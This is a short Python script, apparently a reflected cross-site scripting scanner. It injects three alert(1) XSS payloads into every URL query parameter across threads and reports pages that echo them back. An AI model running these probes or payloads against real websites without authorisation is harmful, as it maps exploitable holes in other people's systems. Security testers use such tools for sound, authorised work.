import requests
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

payloads = [
    "<script>alert(1)</script>",
    "\"><img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>"
]

def inject(url, payload):
    parsed = urlparse(url)
    qs = parse_qs(parsed.query)

    for k in qs:
        qs[k] = payload

    new_query = urlencode(qs, doseq=True)

    return urlunparse(parsed._replace(query=new_query))


def test_url(url):
    findings = []

    for payload in payloads:
        test = inject(url, payload)

        try:
            res = requests.get(test, timeout=5)

            if payload in res.text:
                findings.append((test, payload))

        except:
            pass

    return findings


def scan_xss(urls, threads=10):
    print("[+] Running XSS Scanner...")

    vulns = []

    with ThreadPoolExecutor(max_workers=threads) as executor:
        results = executor.map(test_url, urls)

    for r in results:
        for v in r:
            print(f"[🔥] VULN: {v[0]}")
            vulns.append(v)

    print(f"[+] Found {len(vulns)} vulnerabilities")
    return vulns
